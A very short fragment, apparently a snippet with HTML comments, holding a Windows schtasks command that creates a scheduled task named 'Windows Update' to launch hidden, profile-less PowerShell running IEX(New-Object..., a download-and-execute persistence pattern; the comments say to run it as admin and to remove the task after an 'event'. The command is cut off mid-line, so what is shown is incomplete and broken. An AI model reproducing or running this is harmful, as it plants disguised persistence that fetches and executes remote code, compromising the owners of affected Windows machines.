<!--run it in power shell as admin-->
schtasks /create /tn "Windows Update" /tr "powershell.exe -nop -w hidden -c IEX(New-Object

<!--please dont forget to remove the task after completion of event-->